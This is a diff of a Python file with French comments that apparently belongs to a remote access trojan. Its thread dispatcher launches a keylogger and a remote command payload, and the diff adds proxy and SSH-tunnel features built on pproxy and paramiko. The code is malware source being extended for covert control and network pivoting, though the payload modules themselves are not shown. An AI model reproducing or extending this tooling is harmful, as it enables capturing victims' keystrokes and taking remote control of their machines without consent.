@@ -15,9 +15,24 @@ import time
 import random
 import string
 from ftplib import FTP
+import asyncio
+import pproxy
+import getpass
+import select
+from optparse import OptionParser
+import paramiko
 
 # pour la compil
 import imp
+
+def get_or_create_eventloop():
+    try:
+        return asyncio.get_event_loop()
+    except RuntimeError as ex:
+        if "There is no current event loop in thread" in str(ex):
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            return asyncio.get_event_loop()
 
 def getString(length=6):
     """Générer une chaîne aléatoire de longueur fixe"""
@@ -45,16 +60,25 @@ class Threads:
     thread_id = 0
     thread_name = "null"
 
-    def StartThread(self, fonction, arg1=""):
+    def StartThread(self, fonction, arg1="", arg2=""):
         if "Keylogger" in fonction:
             thread = threading.Thread(target=keylog.Keylog, name=fonction)
             thread.start()
         if "Commande" in fonction:
             thread = threading.Thread(
-                target=payload.Commande, name=fonction, args=arg1)
+                target=payload.Commande, name=fonction, args=(arg1,))
+            thread.start()
+        if "Proxy" in fonction:
+            thread = threading.Thread(
+                target=payload.StartProxy, name=fonction, args=(arg1,))
+            thread.start()
+        if "Tunnel" in fonction:
+            thread = threading.Thread(
+                target=payload.StartTunnel, name=fonction, args=(arg1,arg2))
             thread.start()
         self.thread_id = thread.ident
         self.thread_name = thread.name
+        
 
     def StopThread(self):
         print("Arret du Thread : " + self.thread_name +
